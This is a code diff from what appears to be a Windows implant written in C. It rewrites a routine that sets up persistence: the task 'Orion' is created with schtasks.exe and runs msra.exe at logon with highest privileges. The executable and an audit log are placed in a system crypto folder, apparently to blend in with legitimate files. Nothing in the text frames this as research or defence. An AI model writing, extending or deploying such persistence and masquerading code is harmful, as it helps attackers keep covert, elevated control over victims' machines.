@@ -3,17 +3,8 @@
 #include <tlhelp32.h>
 #include <shobjidl.h>
 #include <objbase.h>
-#include <objidl.h>
-#include <taskschd.h>
 
 #pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "oleaut32.lib")
-#pragma comment(lib, "uuid.lib")
-
-/* ponytail: Task Scheduler 2.0 GUIDs missing from this mingw's libuuid; hard-coded */
-const CLSID CLSID_TaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x55,0x66,0x1f}};
-const IID IID_ITaskService = {0x2faba4a7,0x4da9,0x4013,{0x96,0x97,0x20,0xcc,0xdc,0xaa,0x1a,0x36}};
-const IID IID_IExecAction = {0x4c3d624d,0xfd6b,0x49a3,{0xb9,0xb7,0x73,0xc5,0x6a,0x4c,0x18,0x2a}};
 
 static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
 static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
@@ -115,66 +106,18 @@ static void create_task_orion(void) {
     char taskPath[MAX_PATH];
     wsprintfA(taskPath, "%s\\msra.exe", g_dir);
 
-    ITaskService *pSvc = NULL;
-    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pSvc);
-    if (FAILED(hr)) { audit("[-] CoCreateInstance CLSID_TaskScheduler failed (0x%lx)", hr); return; }
+    // ponytail: check existence via schtasks /query, create if missing (same
+    // reliable path as GOVINDA; the COM Task Scheduler 2.0 API was silently
+    // failing to register the task on this build).
+    char q[MAX_PATH * 2];
+    wsprintfA(q, "schtasks.exe /query /tn Orion >nul 2>&1");
+    if (system(q) == 0) { audit("[+] Orion task already exists"); return; }
 
-    VARIANT vt;
-    VariantInit(&vt);
-    hr = pSvc->lpVtbl->Connect(pSvc, vt, vt, vt, vt);
-    if (FAILED(hr)) { audit("[-] ITaskService Connect failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }
-
-    ITaskFolder *pRoot = NULL;
-    hr = pSvc->lpVtbl->GetFolder(pSvc, (BSTR)L"\\", &pRoot);
-    if (FAILED(hr)) { audit("[-] GetFolder failed (0x%lx)", hr); pSvc->lpVtbl->Release(pSvc); return; }
-
-    // ponytail: check if Orion already registered
-    IRegisteredTask *pExisting = NULL;
-    if (SUCCEEDED(pRoot->lpVtbl->GetTask(pRoot, (BSTR)L"Orion", &pExisting)) && pExisting) {
-        pExisting->lpVtbl->Release(pExisting);
-        audit("[+] Orion task already exists");
-        pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return;
-    }
-
-    ITaskDefinition *pTask = NULL;
-    hr = pSvc->lpVtbl->NewTask(pSvc, 0, &pTask);
-    if (FAILED(hr)) { audit("[-] NewTask failed (0x%lx)", hr); pRoot->lpVtbl->Release(pRoot); pSvc->lpVtbl->Release(pSvc); return; }
-
-    ITriggerCollection *pTriggers = NULL;
-    pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
-    ITrigger *pTrigger = NULL;
-    pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
-    pTrigger->lpVtbl->put_Id(pTrigger, (BSTR)L"LogonTrigger");
-    pTrigger->lpVtbl->Release(pTrigger);
-    pTriggers->lpVtbl->Release(pTriggers);
-
-    IActionCollection *pActions = NULL;
-    pTask->lpVtbl->get_Actions(pTask, &pActions);
-    IAction *pAction = NULL;
-    pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
-    IExecAction *pExec = NULL;
-    if (SUCCEEDED(pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExec))) {
-        WCHAR wpath[MAX_PATH];
-        MultiByteToWideChar(CP_ACP, 0, taskPath, -1, wpath, MAX_PATH);
-        pExec->lpVtbl->put_Path(pExec, wpath);
-        pExec->lpVtbl->Release(pExec);
-    }
-    pAction->lpVtbl->Release(pAction);
-    pActions->lpVtbl->Release(pActions);
-
-    IPrincipal *pPrin = NULL;
-    pTask->lpVtbl->get_Principal(pTask, &pPrin);
-    pPrin->lpVtbl->put_RunLevel(pPrin, TASK_RUNLEVEL_HIGHEST);
-    pPrin->lpVtbl->Release(pPrin);
-
-    IRegisteredTask *pRegTask = NULL;
-    hr = pRoot->lpVtbl->RegisterTaskDefinition(pRoot, (BSTR)L"Orion", pTask, TASK_CREATE_OR_UPDATE, vt, vt, TASK_LOGON_INTERACTIVE_TOKEN, vt, &pRegTask);
-    if (SUCCEEDED(hr)) audit("[+] Orion task created (Task Scheduler API)");
-    else audit("[-] Orion RegisterTaskDefinition failed (0x%lx)", hr);
-    if (pRegTask) pRegTask->lpVtbl->Release(pRegTask);
-    pTask->lpVtbl->Release(pTask);
-    pRoot->lpVtbl->Release(pRoot);
-    pSvc->lpVtbl->Release(pSvc);
+    char c[MAX_PATH * 4];
+    wsprintfA(c, "schtasks.exe /create /tn Orion /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
+    audit("[+] Creating Orion task (schtasks.exe)");
+    if (system(c) == 0) audit("[+] Orion task created");
+    else audit("[-] Orion task creation failed");
 }
 
 static DWORD WINAPI worker_thread(LPVOID lp) {
